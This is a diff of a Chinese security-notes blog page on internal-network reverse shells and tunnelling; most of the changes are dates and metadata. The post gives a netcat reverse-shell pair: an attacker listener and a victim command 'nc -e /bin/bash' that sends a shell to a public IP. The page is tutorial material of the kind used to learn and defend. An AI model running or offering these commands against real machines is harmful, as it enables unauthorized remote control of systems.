@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="反弹shell内网shell反弹的本质是与公网服务器建立连接，将公网服务器传输过来的命令执行，并将结果返回。 比如命令注入，不需要知道机器的账号密码，直接反弹出来 虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。 第一种——nc反弹shell 12黑客机器：nc -lvp 8888公司内网机器：nc -e &#x2F;bin&#x2F;bash 公网IP 8888">
+<meta name="description" content="反弹shell内网shell反弹的本质是与公网服务器建立连接，将公网服务器传输过来的命令执行，并将结果返回。 比如命令注入，不需要知道机器的账号密码，直接反弹出来 虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。">
 <meta name="keywords" content="nc,SSH内网穿透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网刺探及穿透">
-<meta property="og:url" content="http:&#x2F;&#x2F;heyaff.github.io&#x2F;2020&#x2F;04&#x2F;15&#x2F;nc&#x2F;index.html">
+<meta property="og:url" content="http:&#x2F;&#x2F;heyaff.github.io&#x2F;2020&#x2F;04&#x2F;22&#x2F;nc&#x2F;index.html">
 <meta property="og:site_name" content="安全笔记">
-<meta property="og:description" content="反弹shell内网shell反弹的本质是与公网服务器建立连接，将公网服务器传输过来的命令执行，并将结果返回。 比如命令注入，不需要知道机器的账号密码，直接反弹出来 虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。 第一种——nc反弹shell 12黑客机器：nc -lvp 8888公司内网机器：nc -e &#x2F;bin&#x2F;bash 公网IP 8888">
+<meta property="og:description" content="反弹shell内网shell反弹的本质是与公网服务器建立连接，将公网服务器传输过来的命令执行，并将结果返回。 比如命令注入，不需要知道机器的账号密码，直接反弹出来 虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http:&#x2F;&#x2F;heyaff.github.io&#x2F;images&#x2F;SSH-%E5%85%AC%E5%8F%B8%E7%94%B5%E8%84%91.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;heyaff.github.io&#x2F;images&#x2F;SSH-%E9%BB%91%E5%AE%A2%E7%AB%AF.png">
-<meta property="og:updated_time" content="2020-04-15T11:34:23.976Z">
+<meta property="og:updated_time" content="2020-04-22T09:23:29.100Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;heyaff.github.io&#x2F;images&#x2F;SSH-%E5%85%AC%E5%8F%B8%E7%94%B5%E8%84%91.png">
 
@@ -121,7 +121,7 @@
 
 
 
-  <link rel="canonical" href="http://heyaff.github.io/2020/04/15/nc/"/>
+  <link rel="canonical" href="http://heyaff.github.io/2020/04/22/nc/"/>
 
 
 
@@ -298,7 +298,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://heyaff.github.io/2020/04/15/nc/">
+    <link itemprop="mainEntityOfPage" href="http://heyaff.github.io/2020/04/22/nc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="heyaff">
@@ -327,8 +327,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-15T19:34:23+08:00">
-                2020-04-15
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-22T17:23:29+08:00">
+                2020-04-22
               </time>
             
 
@@ -395,6 +395,7 @@
         <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>内网shell反弹的本质是与公网服务器建立连接，将公网服务器传输过来的命令执行，并将结果返回。</p>
 <p>比如命令注入，不需要知道机器的账号密码，直接反弹出来</p>
 <p>虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。</p>
+<a id="more"></a>
 <p>第一种——nc反弹shell</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黑客机器：nc -lvp 8888</span><br><span class="line">公司内网机器：nc -e /bin/bash 公网IP 8888</span><br></pre></td></tr></table></figure>
 
